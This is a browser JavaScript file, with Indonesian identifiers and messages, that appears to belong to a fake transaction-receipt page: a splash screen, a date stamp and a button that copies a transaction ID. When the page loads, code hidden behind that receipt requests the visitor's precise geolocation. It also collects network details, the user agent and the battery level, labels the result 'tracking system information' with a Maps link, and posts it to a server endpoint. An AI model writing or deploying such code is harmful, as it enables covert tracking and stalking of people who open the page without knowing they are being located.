function toDMS(decimal, isLat) {
    const absolute = Math.abs(decimal);
    const degrees = Math.floor(absolute);
    const minutesNotTruncated = (absolute - degrees) * 60;
    const minutes = Math.floor(minutesNotTruncated);
    const seconds = ((minutesNotTruncated - minutes) * 60).toFixed(1);
    const direction = isLat ? (decimal >= 0 ? "N" : "S") : (decimal >= 0 ? "E" : "W");
    return `${degrees}°${minutes}'${seconds}"${direction}`;
}

function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    if (!connection) {
        return {
            type: "Unavailable",
            effectiveType: "Unavailable",
            downlink: null,
            rtt: null,
            description: "Network Info tidak didukung"
        };
    }

    const type = connection.type || "unknown";
    const effectiveType = connection.effectiveType || "unknown";
    const downlink = connection.downlink || null;
    const rtt = connection.rtt || null;

    let description = "";
    if (type === "wifi") {
        description = "WiFi";
    } else if (type === "cellular") {
        description = `Cellular (${effectiveType.toUpperCase()})`;
    } else {
        description = `${type} (${effectiveType})`;
    }

    if (downlink) description += ` • ~${downlink} Mbps`;
    if (rtt) description += ` • RTT ${rtt}ms`;

    return { type, effectiveType, downlink, rtt, description };
}

async function kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus) {
    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const dms = `${toDMS(latitude, true)} ${toDMS(longitude, false)}`;

    const pesan = `⚠︎ tracking system information

Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy} meter

Network Type: ${networkInfo.type}
Effective Type: ${networkInfo.effectiveType}
Detail: ${networkInfo.description}
${networkInfo.downlink ? `Downlink: ~${networkInfo.downlink} Mbps` : ""}
${networkInfo.rtt ? `RTT: ${networkInfo.rtt} ms` : ""}

Device Info: ${deviceInfo}
Battery Level: ${batteryStatus.level}%
Charging: ${batteryStatus.charging ? "Yes" : "No"}

Maps: ${mapsUrl}

[${dms}](${mapsUrl})`;

    try {
        const res = await fetch("/api/notify", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message: pesan })
        });

        const data = await res.json();
        if (!res.ok) {
            console.error("Gagal kirim informasi:", data);
            return;
        }

        console.log("Lokasi dan informasi terkirim melalui endpoint server");
    } catch (err) {
        console.error("Gagal kirim informasi:", err);
    }
}

function berhasilLokasi(posisi) {
    const latitude = posisi.coords.latitude;
    const longitude = posisi.coords.longitude;
    const accuracy = posisi.coords.accuracy;

    const networkInfo = getNetworkInfo();
    const deviceInfo = navigator.userAgent;

    let batteryStatus = { level: "Unavailable", charging: false };

    const kirim = () => {
        kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
    };

    if (navigator.getBattery) {
        navigator.getBattery()
            .then((battery) => {
                batteryStatus = {
                    level: Math.floor(battery.level * 100),
                    charging: battery.charging
                };
                kirim();
            })
            .catch(kirim);
    } else {
        kirim();
    }

    console.log("Latitude :", latitude);
    console.log("Longitude:", longitude);
    console.log("Accuracy :", accuracy, "meter");
    console.log("Network  :", networkInfo);
    console.log("Device Info:", deviceInfo);
}

function gagalLokasi(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            console.error("Izin lokasi ditolak.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.error("Lokasi tidak tersedia.");
            break;
        case error.TIMEOUT:
            console.error("Timeout lokasi.");
            break;
        default:
            console.error("Error lokasi:", error.message);
    }
}

if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(berhasilLokasi, gagalLokasi, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
} else {
    console.error("Browser tidak mendukung Geolocation.");
}

let isRedirecting = false;
let toastTimer = null;

function updateDateTime() {
    const now = new Date();
    const datePart = now.toLocaleDateString("id-ID", {
        day: "2-digit",
        month: "short",
        year: "numeric"
    });
    const timePart = now.toLocaleTimeString("id-ID", {
        hour: "2-digit",
        minute: "2-digit",
        hour12: false
    }).replace(":", ".");

    const el = document.getElementById("realtimeDateTime");
    if (el) {
        el.textContent = `${datePart} • ${timePart}`;
    }
}

function showToast(message) {
    const toast = document.getElementById("toast");
    if (!toast) return;

    toast.textContent = message;
    toast.classList.add("show");

    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
        toast.classList.remove("show");
    }, 2200);
}

function copyTxId() {
    const txEl = document.getElementById("txIdText");
    if (!txEl) return;

    const cleanId = txEl.innerText.replace(/\s+/g, "").trim();
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(cleanId)
            .then(() => showToast("ID Transaksi berhasil disalin"))
            .catch(() => showToast("Gagal menyalin ID Transaksi"));
    }
}

function showSecondPage() {
    if (isRedirecting) return;
    isRedirecting = true;

    const splash = document.getElementById("splash");
    const page = document.getElementById("page-content");

    splash.classList.add("fade-out");

    setTimeout(() => {
        splash.style.display = "none";
        page.classList.add("show");
        updateDateTime();
    }, 350);
}

setTimeout(showSecondPage, 2000);